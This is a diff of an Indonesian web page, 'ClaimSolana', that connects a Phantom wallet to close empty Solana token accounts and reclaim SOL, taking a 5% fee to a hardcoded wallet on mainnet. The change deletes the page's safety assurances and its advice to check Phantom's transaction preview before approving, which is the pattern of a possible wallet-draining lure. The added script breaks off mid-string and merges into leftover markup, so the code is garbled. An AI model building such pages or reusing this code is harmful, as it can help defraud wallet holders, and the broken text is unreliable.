@@ -3,38 +3,54 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ClaimSolana - Klaim SOL Kamu</title>
+<title>ClaimSolana</title>
 <script src="https://unpkg.com/@solana/web3.js@1.90.1/lib/index.iife.min.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.js"></script>
 <style>
 body{font-family:Arial;background:#0f0f0f;color:#fff;display:flex;justify-content:center;padding:20px}
 .card{background:#1a1a1a;padding:25px;border-radius:16px;max-width:430px;width:100%;text-align:center}
 button{background:#9945FF;color:#fff;border:0;padding:12px;border-radius:10px;width:100%;margin-top:12px;font-weight:bold;cursor:pointer}
-button:disabled{opacity:0.5;cursor:not-allowed}
+button:disabled{opacity:.5}
 #info{font-size:14px;line-height:1.6;margin-top:15px}
 </style>
 </head>
 <body>
 <div class="card">
 <h2>ClaimSolana</h2>
-<p style="color:#aaa;font-size:13px">Tutup akun token kosong & klaim SOL kamu kembali.</p>
-<div style="background:#222;border:1px solid #333;padding:12px;border-radius:12px;margin:15px 0;font-size:13px;color:#aaa;text-align:left">
-✅ <b style="color:#fff">Non-custodial:</b> Tidak minta seed phrase<br>
-✅ <b style="color:#fff">Transparan:</b> Fee 5% dari hasil reclaim<br>
-✅ <b style="color:#fff">Aman:</b> Preview di Phantom
-</div>
+<p style="color:#aaa;font-size:13px">Tutup akun token kosong & klaim SOL kembali</p>
 <button id="connectBtn">Connect Phantom</button>
 <div id="info">Belum connect</div>
 <div id="disclaimerBox" style="display:none;background:#2a1a00;border:1px solid #665500;padding:12px;border-radius:10px;margin-top:15px;text-align:left;font-size:12px;color:#ffcc66">
 <b style="color:#ffaa00">⚠️ DISCLAIMER:</b><br>
-1. Hanya menutup akun SPL Token saldo 0.<br>
-2. TIDAK perlu kosongkan wallet SOL, sisakan 0.01 SOL untuk gas.<br>
-3. Hasil = 0.00203 SOL per akun kosong.<br>
-4. Selalu cek preview di Phantom sebelum approve.
+1. Hanya tutup akun SPL saldo 0<br>
+2. TIDAK perlu kosongkan wallet, sisakan 0.01 SOL untuk gas<br>
+3. Hasil 0.00203 SOL / akun
 </div>
-<label id="agreeLabel" style="display:none;gap:8px;margin-top:12px;font-size:12px;text-align:left;cursor:pointer;align-items:flex-start">
-<input type="checkbox" id="agreeCheck"><span>Saya paham, ini hanya menutup akun token kosong.</span>
-</label>
+<label id="agreeLabel" style="display:none;gap:8px;margin-top:12px;font-size:12px;text-align:left;cursor:pointer"><input type="checkbox" id="agreeCheck"><span>Saya paham, hanya tutup akun kosong</span></label>
+<button id="claimBtn" style="display:none" disabled>Klaim Sekarang</button>
+<div id="debug" style="margin-top:10px;font-size:10px;color:#555"></div>
+</div>
+<script>
+const FEE_WALLET_STR = "HptgriUnvav3AitnWf5DWinZ7gncB5GMwMgaTFuUPNdr";
+const FEE_PERCENT = 5;
+let pubkey, provider, emptyAccounts = [];
+const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+
+async function connectWallet(){
+  try{
+    document.getElementById('debug').innerText = "Mencoba connect...";
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const { solana } = window;
+
+    if (isMobile && (!solana || !solana.isPhantom)) {
+      document.getElementById('debug').innerText = "Buka di Phantom...";
+      const url = window.location.href;
+      window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(window.location.origin)}`;
+      return;
+    }
+
+    if(!solana || !solana.isPhantom){
+      alert("Ph</label>
 <button id="claimBtn" style="display:none" disabled>Klaim Sekarang</button>
 </div>
 <script>
